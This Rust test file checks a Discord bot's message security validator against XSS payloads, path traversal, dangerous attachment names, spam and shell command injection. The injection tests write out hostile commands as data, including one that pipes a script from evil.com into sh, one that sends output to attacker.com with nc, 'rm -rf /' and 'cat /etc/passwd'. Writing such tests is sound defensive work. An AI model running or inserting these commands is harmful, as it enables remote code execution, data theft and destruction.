/// 📨 MESSAGE SECURITY TESTS  
/// Purpose: Test message validation, sanitization, and security without Serenity dependencies
/// Coverage: Message validation, command injection prevention, spam detection, attachment security, rate limiting
use crate::discord::{MessageRateLimiter, MessageSecurityValidator, RiskLevel};
use std::time::{Duration, Instant};

#[cfg(test)]
mod message_validation_security {
    use super::*;

    /// 🛡️ Test message content sanitization
    #[test]
    fn test_message_content_sanitization() {
        let validator = MessageSecurityValidator::new();

        let malicious_messages = vec![
            "<script>alert('xss')</script>",            // XSS attempt
            "javascript:alert(1)",                      // JavaScript protocol
            "data:text/html,<script>alert(1)</script>", // Data URI
            "../../etc/passwd",                         // Path traversal
            "$(rm -rf /)",                              // Command injection
            "`whoami`",                                 // Backtick injection
            "${USER}",                                  // Variable expansion
        ];

        for (i, content) in malicious_messages.iter().enumerate() {
            let result = validator.validate_message_content(content);

            // All malicious content should be detected and rejected
            assert!(
                !result.is_valid,
                "Malicious message #{} not detected: {}",
                i, content
            );
            assert!(
                result.risk_level != RiskLevel::Low,
                "Should have elevated risk level"
            );
        }
    }

    /// 🔍 Test message length limits and DoS prevention
    #[test]
    fn test_message_length_limits() {
        let validator = MessageSecurityValidator::new();

        let test_cases = vec![
            ("".to_string(), false),      // Empty message
            ("a".repeat(1), true),        // Minimum valid length
            ("a".repeat(4000), true),     // Max length (4000)
            ("a".repeat(4001), false),    // Just over limit
            ("a".repeat(10000), false),   // Way over limit
            ("a".repeat(1000000), false), // DoS attempt
        ];

        for (content, should_be_valid) in test_cases {
            let result = validator.validate_message_length(&content);
            assert_eq!(
                result.is_valid,
                should_be_valid,
                "Message length validation failed for length: {}",
                content.len()
            );
        }
    }

    /// 📎 Test attachment security
    #[test]
    fn test_attachment_security() {
        let validator = MessageSecurityValidator::new();

        let dangerous_attachments = vec![
            "malware.exe",
            "virus.bat",
            "script.js",
            "shell.sh",
            "trojan.scr",
            "backdoor.pif",
            "keylogger.com",
            "exploit.jar",
            "payload.bin",
            "../../../etc/passwd",
        ];

        for attachment in dangerous_attachments {
            let result = validator.validate_attachment_name(attachment);
            assert!(
                !result.is_valid,
                "Dangerous attachment should be blocked: {}",
                attachment
            );
            assert!(
                result.risk_level != RiskLevel::Low,
                "Should have elevated risk level"
            );
        }

        // Test safe attachments
        let safe_attachments = vec![
            "image.png",
            "document.pdf",
            "data.csv",
            "report.txt",
            "photo.jpg",
        ];

        for attachment in safe_attachments {
            let result = validator.validate_attachment_name(attachment);
            assert!(
                result.is_valid,
                "Safe attachment should be allowed: {}",
                attachment
            );
            assert_eq!(
                result.risk_level,
                RiskLevel::Low,
                "Should have low risk level"
            );
        }
    }

    /// 🚫 Test spam detection
    #[test]
    fn test_spam_detection() {
        let validator = MessageSecurityValidator::new();

        let spam_patterns = vec![
            "CLICK HERE NOW!!!",
            "FREE MONEY $$$",
            "🎁🎁🎁 WIN BIG 🎁🎁🎁",
            "aaaaaaaaaaaaaaaaaaa", // Repeated characters
            "JOIN MY SERVER discord.gg/spam",
            "BUY CHEAP COINS",
        ];

        for pattern in spam_patterns {
            assert!(
                validator.is_spam_message(pattern),
                "Spam pattern not detected: {}",
                pattern
            );
        }

        let legitimate_messages = vec![
            "Hello, how are you?",
            "Can you help me with this code?",
            "Thanks for the information!",
            "Good morning everyone",
        ];

        for message in legitimate_messages {
            assert!(
                !validator.is_spam_message(message),
                "Legitimate message flagged as spam: {}",
                message
            );
        }
    }

    /// 💉 Test prevention of command injection
    #[test]
    fn test_command_injection_prevention() {
        let validator = MessageSecurityValidator::new();

        let injection_attempts = vec![
            "!admin $(rm -rf /)",                               // Command substitution
            "!config `whoami`",                                 // Backtick execution
            "!system ${PATH}",                                  // Variable expansion
            "!execute |& cat /etc/passwd",                      // Pipe injection
            "!run ; curl evil.com/shell.sh | sh",               // Command chaining
            "!cmd && wget malware.exe",                         // Logical AND
            "!tool || echo 'hacked'",                           // Logical OR
            "!debug 2>&1 | nc attacker.com 1337",               // Redirection
            "!test `python -c 'import os; os.system(\"ls\")'`", // Python injection
            "!eval $(echo 'rm important.txt')",                 // Echo injection
        ];

        for (i, command) in injection_attempts.iter().enumerate() {
            let result = validator.validate_command_input(command);
            assert!(
                !result.is_valid,
                "Command injection #{} not detected: {}",
                i, command
            );
            assert_eq!(
                result.risk_level,
                RiskLevel::Critical,
                "Command injection should be critical risk: {}",
                command
            );
        }
    }

    /// 🛡️ Test safe command parsing
    #[test]
    fn test_safe_command_parsing() {
        let validator = MessageSecurityValidator::new();

        let safe_commands = vec![
            "!help",
            "!status user123",
            "!info channel general",
            "!version",
        ];

        for command in safe_commands {
            let result = validator.validate_command_input(command);
            assert!(
                result.is_valid,
                "Safe command incorrectly flagged: {}",
                command
            );
            assert_eq!(
                result.risk_level,
                RiskLevel::Low,
                "Safe command should have low risk: {}",
                command
            );
        }

        // Test admin-style commands (these are actually safe by current validator logic)
        let admin_commands = vec!["!config timeout 30", "!stats daily"];

        for command in admin_commands {
            let result = validator.validate_command_input(command);
            // These are considered safe since they don't contain dangerous chars/keywords
            assert!(
                result.is_valid,
                "Safe admin command should be valid: {}",
                command
            );
            assert_eq!(
                result.risk_level,
                RiskLevel::Low,
                "Safe admin command should have low risk: {}",
                command
            );
        }
    }
}

#[cfg(test)]
mod rate_limiting_security {
    use super::*;

    /// ⏱️ Test rate limiting implementation
    #[test]
    fn test_message_rate_limiting() {
        let mut rate_limiter = MessageRateLimiter::new();
        let user_id = 12345u64;
        let now = Instant::now();

        // Allow initial messages
        for i in 0..5 {
            assert!(
                rate_limiter.is_allowed(user_id, now + Duration::from_millis(i * 100)),
                "Message {} should be allowed",
                i
            );
        }

        // Should start blocking after limit
        for i in 5..10 {
            assert!(
                !rate_limiter.is_allowed(user_id, now + Duration::from_millis(i * 100)),
                "Message {} should be blocked",
                i
            );
        }

        // Should allow again after cooldown
        let later = now + Duration::from_secs(60);
        assert!(
            rate_limiter.is_allowed(user_id, later),
            "Message should be allowed after cooldown"
        );
    }
}
